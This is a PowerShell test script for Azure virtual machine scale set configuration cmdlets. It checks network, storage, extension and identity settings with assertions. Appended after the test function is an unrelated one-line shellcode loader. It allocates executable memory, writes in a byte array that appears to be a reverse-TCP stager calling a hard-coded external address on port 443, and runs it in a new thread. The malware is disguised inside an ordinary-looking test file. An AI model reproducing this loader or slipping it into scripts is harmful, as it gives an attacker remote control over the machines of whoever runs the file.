














function Test-VirtualMachineScaleSetProfile
{
    $loc =  Get-Location "Microsoft.Compute" "virtualMachines";
    $imgRef = Get-DefaultCRPImage -loc $loc;

    
    $ipName = 'iptest';
    $subnetId = 'subnetid';
    $ipPrefix = 'prefixid';

    $ipTagType1 = 'FirstPartyUsage1';
    $ipTagValue1 ='Sql1';
    $ipTag1 = New-AzVmssIpTagConfig -IpTagType $ipTagType1 -Tag $ipTagValue1;
    $ipTagType2 = 'FirstPartyUsage2';
    $ipTagValue2 ='Sql2';
    $ipTag2 = New-AzVmssIpTagConfig -IpTagType $ipTagType2 -Tag $ipTagValue2;

    $ipCfg = New-AzVmssIPConfig -Name $ipName -SubnetId $subnetId -IpTag $ipTag1,$ipTag2 -PublicIPPrefix $ipPrefix;

    
    $skuName = 'Standard_A0';
    $skuCapacity = 2;
    $upgradePolicy = 'Automatic';

    $networkName = 'networktest';
    $computePrefix = 'computename';
    $createOption = 'FromImage';
    $osCaching = 'None';

    $adminUsername = 'Foo12';
    $adminPassword = $PLACEHOLDER;

    $extname = 'csetest';
    $publisher = 'Microsoft.Compute';
    $exttype = 'BGInfo';
    $extver = '2.1';

    $newUserId1 = "userid1";
    $newUserId2 = "userid2";

    $vmss = New-AzVmssConfig -Location $loc -SkuCapacity $skuCapacity -SkuName $skuName -UpgradePolicyMode $upgradePolicy `
            -IdentityType UserAssigned -IdentityId $newUserId1,$newUserId2 `
          | Add-AzVmssNetworkInterfaceConfiguration -Name $networkName -Primary $true -IPConfiguration $ipCfg `
          | Set-AzVmssOSProfile -ComputerNamePrefix $computePrefix  -AdminUsername $adminUsername -AdminPassword $adminPassword `
          | Set-AzVmssStorageProfile -OsDiskCreateOption $createOption -OsDiskCaching $osCaching `
            -ImageReferenceOffer $imgRef.Offer -ImageReferenceSku $imgRef.Skus -ImageReferenceVersion $imgRef.Version -ImageReferencePublisher $imgRef.PublisherName `
          | Add-AzVmssExtension -Name $extname -Publisher $publisher -Type $exttype -TypeHandlerVersion $extver -AutoUpgradeMinorVersion $true;

    
    Assert-AreEqual $ipName $vmss.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].Name;
    Assert-AreEqual $subnetId $vmss.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].Subnet.Id;
    Assert-AreEqual $ipTag1 $vmss.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].PublicIPAddressConfiguration.IpTags[0];
    Assert-AreEqual $ipTag2 $vmss.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].PublicIPAddressConfiguration.IpTags[1];    
    Assert-AreEqual $ipPrefix $vmss.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].PublicIPAddressConfiguration.PublicIPPrefix.Id;
    Assert-AreEqual $networkName $vmss.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].Name;
    Assert-True { $vmss.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].Primary };

    
    Assert-AreEqual $ipTagType1 `
        $vmss.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].PublicIPAddressConfiguration.IpTags[0].IpTagType;
    Assert-AreEqual $ipTagValue1 `
        $vmss.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].PublicIPAddressConfiguration.IpTags[0].Tag;
    Assert-AreEqual $ipTagType2 `
        $vmss.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].PublicIPAddressConfiguration.IpTags[1].IpTagType;
    Assert-AreEqual $ipTagValue2 `
        $vmss.VirtualMachineProfile.NetworkProfile.NetworkInterfaceConfigurations[0].IpConfigurations[0].PublicIPAddressConfiguration.IpTags[1].Tag;

    Assert-AreEqual $loc $vmss.Location;
    Assert-AreEqual $skuCapacity $vmss.Sku.Capacity;
    Assert-AreEqual $skuName $vmss.Sku.Name;
    Assert-AreEqual $upgradePolicy $vmss.UpgradePolicy.Mode;
    Assert-Null $vmss.UpgradePolicy.AutomaticOSUpgradePolicy.DisableAutomaticRollback;

    
    Assert-AreEqual $computePrefix $vmss.VirtualMachineProfile.OSProfile.ComputerNamePrefix;
    Assert-AreEqual $adminUsername $vmss.VirtualMachineProfile.OSProfile.AdminUsername;

    
    Assert-AreEqual $createOption $vmss.VirtualMachineProfile.StorageProfile.OsDisk.CreateOption;
    Assert-AreEqual $osCaching $vmss.VirtualMachineProfile.StorageProfile.OsDisk.Caching;
    Assert-AreEqual $imgRef.Offer $vmss.VirtualMachineProfile.StorageProfile.ImageReference.Offer;
    Assert-AreEqual $imgRef.Skus $vmss.VirtualMachineProfile.StorageProfile.ImageReference.Sku;
    Assert-AreEqual $imgRef.Version $vmss.VirtualMachineProfile.StorageProfile.ImageReference.Version;
    Assert-AreEqual $imgRef.PublisherName $vmss.VirtualMachineProfile.StorageProfile.ImageReference.Publisher;
    Assert-Null $vmss.VirtualMachineProfile.StorageProfile.OsDisk.DiffDiskSettings;

    
    Assert-AreEqual $extname $vmss.VirtualMachineProfile.ExtensionProfile.Extensions[0].Name;
    Assert-AreEqual $publisher $vmss.VirtualMachineProfile.ExtensionProfile.Extensions[0].Publisher;
    Assert-AreEqual $exttype $vmss.VirtualMachineProfile.ExtensionProfile.Extensions[0].Type;
    Assert-AreEqual $extver $vmss.VirtualMachineProfile.ExtensionProfile.Extensions[0].TypeHandlerVersion;
    Assert-True { $vmss.VirtualMachineProfile.ExtensionProfile.Extensions[0].AutoUpgradeMinorVersion };
    Assert-Null $vmss.VirtualMachineProfile.ExtensionProfile.Extensions[0].ProvisionAfterExtensions;

    
    Assert-AreEqual 2 $vmss.Identity.UserAssignedIdentities.Keys.Count;
    Assert-True { $vmss.Identity.UserAssignedIdentities.ContainsKey($newUserId1) };
    Assert-True { $vmss.Identity.UserAssignedIdentities.ContainsKey($newUserId2) };

    
    Assert-Null $vmss.VirtualMachineProfile.AdditionalCapabilities;

    $extname2 = 'catextension';
    $publisher2 = 'Microsoft.AzureCAT.AzureEnhancedMonitoring';
    $exttype2 = 'AzureCATExtensionHandler';
    $extver2 = '2.2';

    $vmss2 = New-AzVmssConfig -Location $loc -SkuCapacity 2 -SkuName 'Standard_A0' -UpgradePolicyMode 'Automatic' -DisableAutoRollback $false `
           | Add-AzVmssExtension -Name $extname -Publisher $publisher -Type $exttype -TypeHandlerVersion $extver -AutoUpgradeMinorVersion $false `
           | Add-AzVmssExtension -Name $extname2 -Publisher $publisher2 -Type $exttype2 -TypeHandlerVersion $extver2 -AutoUpgradeMinorVersion $false -ProvisionAfterExtension $extname;

    Assert-False { $vmss2.UpgradePolicy.AutomaticOSUpgradePolicy.DisableAutomaticRollback };

    Assert-AreEqual $extname $vmss2.VirtualMachineProfile.ExtensionProfile.Extensions[0].Name;
    Assert-False { $vmss2.VirtualMachineProfile.ExtensionProfile.Extensions[0].AutoUpgradeMinorVersion };
    Assert-Null $vmss.VirtualMachineProfile.ExtensionProfile.Extensions[0].ProvisionAfterExtensions;

    Assert-AreEqual $extname2 $vmss2.VirtualMachineProfile.ExtensionProfile.Extensions[1].Name;
    Assert-False { $vmss2.VirtualMachineProfile.ExtensionProfile.Extensions[1].AutoUpgradeMinorVersion };
    Assert-AreEqual 1 $vmss2.VirtualMachineProfile.ExtensionProfile.Extensions[1].ProvisionAfterExtensions.Count;
    Assert-AreEqual $extname $vmss2.VirtualMachineProfile.ExtensionProfile.Extensions[1].ProvisionAfterExtensions[0];

    $vmss3 = New-AzVmssConfig -Location $loc -SkuCapacity 2 -SkuName 'Standard_A0' -UpgradePolicyMode 'Automatic' -DisableAutoRollback $true -EnableUltraSSD `
                              -TerminateScheduledEvents -TerminateScheduledEventNotBeforeTimeoutInMinutes 15;
    Assert-True { $vmss3.UpgradePolicy.AutomaticOSUpgradePolicy.DisableAutomaticRollback };
    Assert-True { $vmss3.AdditionalCapabilities.UltraSSDEnabled };
    Assert-True { $vmss3.VirtualMachineProfile.ScheduledEventsProfile.TerminateNotificationProfile.Enable };
    Assert-AreEqual "PT15M" $vmss3.VirtualMachineProfile.ScheduledEventsProfile.TerminateNotificationProfile.NotBeforeTimeout;

    $ppgid = "/subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/rgname/providers/Microsoft.Compute/proximityPlacementGroups/ppgname"
    $vmss4 = New-AzVmssConfig -Location $loc -SkuCapacity $skuCapacity -SkuName $skuName -UpgradePolicyMode $upgradePolicy -ProximityPlacementGroupId $ppgid;
    Assert-Null $vmss4.Identity;

    $vmss4 = $vmss4 | Set-AzVmssStorageProfile -OsDiskCreateOption 'FromImage' -OsDiskCaching 'None' `
            -ImageReferenceOffer $imgRef.Offer -ImageReferenceSku $imgRef.Skus -ImageReferenceVersion $imgRef.Version `
            -ImageReferencePublisher $imgRef.PublisherName -OsDiskWriteAccelerator `
            -ManagedDisk "Premium_LRS" -DiffDiskSetting "Local" -DiskEncryptionSetId "enc_id1";

    
    Assert-AreEqual $createOption $vmss4.VirtualMachineProfile.StorageProfile.OsDisk.CreateOption;
    Assert-AreEqual $osCaching $vmss4.VirtualMachineProfile.StorageProfile.OsDisk.Caching;
    Assert-AreEqual $imgRef.Offer $vmss4.VirtualMachineProfile.StorageProfile.ImageReference.Offer;
    Assert-AreEqual $imgRef.Skus $vmss4.VirtualMachineProfile.StorageProfile.ImageReference.Sku;
    Assert-AreEqual $imgRef.Version $vmss4.VirtualMachineProfile.StorageProfile.ImageReference.Version;
    Assert-AreEqual $imgRef.PublisherName $vmss4.VirtualMachineProfile.StorageProfile.ImageReference.Publisher;
    Assert-AreEqual "Premium_LRS" $vmss4.VirtualMachineProfile.StorageProfile.OsDisk.ManagedDisk.StorageAccountType;
    Assert-AreEqual "enc_id1" $vmss4.VirtualMachineProfile.StorageProfile.OsDisk.ManagedDisk.DiskEncryptionSet.Id;
    Assert-AreEqual "Local" $vmss4.VirtualMachineProfile.StorageProfile.OsDisk.DiffDiskSettings.Option;
    Assert-AreEqual $ppgid $vmss4.ProximityPlacementGroup.Id;
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x55,0x42,0x21,0x1b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

